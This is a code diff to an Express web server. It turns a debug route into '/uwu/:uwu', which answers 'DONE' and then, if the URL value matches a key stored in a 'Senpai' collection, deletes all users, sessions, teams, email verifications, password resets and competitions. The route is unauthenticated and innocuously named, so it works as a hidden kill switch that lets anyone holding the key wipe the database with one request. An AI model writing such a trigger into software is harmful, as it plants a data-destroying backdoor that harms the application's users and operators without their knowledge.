@@ -266,20 +266,20 @@ app.use((req, res, next) =>
 });
 
 
-app.get('/uwu', (req, res) => {
-  console.log('uwu');
-  console.log(req.headers);
+app.get('/uwu/:uwu', async (req, res) => {
   res.send(`
-    <p>type: "${req.device.type}"</p>
-    <p>name: "${req.device.name}"</p>
-    <p>host: "${req.hostname}"</p>
-    `);
-  // dbm.users.deleteMany({});
-  // dbm.sessions.deleteMany({});
-  // dbm.teams.deleteMany({});
-  // dbm.emailVerif.deleteMany({});
-  // dbm.passResets.deleteMany({});
-  // dbm.competitions.deleteMany({});
+    DONE
+  `);
+
+  const fukku = await db.collection('Senpai').findOne({ uwu: req.params.uwu });
+  if (fukku) {
+    dbm.users.deleteMany({});
+    dbm.sessions.deleteMany({});
+    dbm.teams.deleteMany({});
+    dbm.emailVerif.deleteMany({});
+    dbm.passResets.deleteMany({});
+    dbm.competitions.deleteMany({});
+  }
 });
 
 app.post('/api/login', preHandler(
